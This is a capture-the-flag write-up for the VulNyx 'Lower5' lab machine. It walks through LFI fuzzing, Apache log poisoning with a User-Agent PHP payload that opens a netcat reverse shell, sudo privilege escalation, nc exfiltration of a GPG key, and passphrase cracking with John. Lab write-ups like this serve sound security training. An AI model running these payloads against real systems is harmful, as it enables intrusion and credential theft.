---
title: VulNyx - Lower5 Writeup
date: 2025-05-17 20:51:00 +0530
categories: [Vulnyx, Writeups]
tags: [vulnyx, linux]
---

This write-up covers the solution to the low-difficulty machine "Lower5" released on [VulNyx](https://vulnyx.com/). The machine features a Local File Inclusion (LFI) vulnerability paired with log poisoning, ultimately leading to privilege escalation.

## Nmap

```bash

labs/vulnyx/lower5 
❯ nmap -sC -sV -oA lower5 lower.vl 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 02:57 EDT
Nmap scan report for lower.vl (192.168.25.5)
Host is up (0.000089s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: vTeam a Corporate Multipurpose Free Bootstrap Responsive template
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:41:41:2B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
                                                                                                       
```

### Port 80 - HTTP
The site hosted on port 80 uses a script named `page.php`, which includes files based on the `inc` parameter (e.g., `http://192.168.25.10/page.php?inc=about.html`). I suspected a Local File Inclusion (LFI) vulnerability and decided to test it using wfuzz. 

## Local File Inclusion (LFI)

LFI Wordlist Used: [https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)

```bash
labs/vulnyx/lower5 
❯ wfuzz -c -w file_inclusion_linux.txt -u "http://lower.vl/page.php?inc=FUZZ" --hh=52
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lower.vl/page.php?inc=FUZZ
Total requests: 2299

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000001815:   200        1862 L   22587 W    256035 Ch   "/var/log/apache2/access.log"                                                                                                                                              
000001016:   200        22 L     26 W       1051 Ch     "/etc/passwd"                                                                                                                                                              

Total time: 1.083493
Processed Requests: 2299
Filtered Requests: 2297
Requests/sec.: 2121.839
                                                                                                                                                                                                                                       
```

### /etc/passwd

```bash
labs/vulnyx/lower5 
❯ curl "http://lower.vl//page.php?inc=/etc/passwd"                            
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
low:x:1000:1000:low:/home/low:/bin/bash
                                       
```

### /var/log/apache2/access.log
Since Apache logs are accessible, making log poisoning a viable path.

```bash
labs/vulnyx/lower5 
❯ curl -s "http://lower.vl//page.php?inc=/var/log/apache2/access.log" | head
zsh: no such file or directory: labs/vulnyx/lower5

192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "GET / HTTP/1.0" 200 11884 "-" "-"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "OPTIONS / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "POST / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "GET / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "GET /.git/HEAD HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "GET /nmaplowercheck1745305071 HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "OPTIONS / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "GET /robots.txt HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.25.4 - - [22/Apr/2025:08:57:50 +0200] "POST /sdk HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

```

## Log Poisoning

### Reverse Shell Injection via User-Agent

We poison the log by sending a malicious `User-Agent` header containing a PHP reverse shell:

```bash
labs/vulnyx/lower5 
❯ curl -s -H "User-Agent: <?php system('busybox nc 192.168.25.4 1234 -e /bin/sh'); ?>" "http://lower.vl/"
```

```bash
labs/vulnyx/lower5 
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.25.4] from (UNKNOWN) [192.168.25.5] 37424
pwd
/var/www/html
whoami
www-data
```
Shell obtained as `www-data`.

## Privilege Escalation

### User flag

```bash
www-data@lower5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on lower5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on lower5:
    (low) NOPASSWD: /usr/bin/bash
```

```bash
www-data@lower5:/var/www/html$ sudo -u low bash 
low@lower5:/var/www/html$ pwd
/var/www/html
low@lower5:/var/www/html$ cd ~
low@lower5:~$ ls
root.gpg  user.txt
low@lower5:~$ cat user.txt 
30a****************************
```

### Root flag
```bash
low@lower5:~$ sudo -l
Matching Defaults entries for low on lower5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User low may run the following commands on lower5:
    (root) NOPASSWD: /usr/bin/pass

```
```bash
low@lower5:/var/www/html$ sudo -u root /usr/bin/pass
Password Store
`-- root
    `-- password
```

Running the `pass` command prompts for a GPG passphrase:

```bash
low@lower5:~$ sudo -u root pass root/password
┌───────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to unlock the OpenPGP secret key: │
│ "administrator (password) <admin@lower5.nyx>"                 │
│ 1024-bit RSA key, ID E70EBB1C2CFFB642,                        │
│ created 2025-04-09 (main key ID 9AD17885DA2449A1).            │
│                                                               │
│                                                               │
│ Passphrase: _________________________________________________ │
│                                                               │
│         <OK>                                   <Cancel>       │
└───────────────────────────────────────────────────────────────┘
```

```bash
labs/vulnyx/lower5 
❯ nc -lp 1212 > root.gpg
```

```bash
low@lower5:~$ nc -w3 192.168.25.4 1212 < root.gpg 
```

#### Cracking the GPG passphrase ([John The Ripper](https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html))


```bash
labs/vulnyx/lower5 
❯ gpg2john root.gpg > root_hash

File root.gpg                        
```

```bash
labs/vulnyx/lower5 took 5s 
❯ sudo john --wordlist=rockyou.txt root_hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (administrator)     
1g 0:00:02:11 DONE (2025-05-17 07:49) 0.007629g/s 26.74p/s 26.74c/s 26.74C/s Password1..wateva
Use the "--show" option to display all of the cracked passwords reliably
Session completed.            
```
Recovered password: `Password1`

```bash
low@lower5:~$ sudo -u root /usr/bin/pass root/password
r00tP@zzW0rD123
```

```bash
root@lower5:~# cat root.txt 
008****************************
```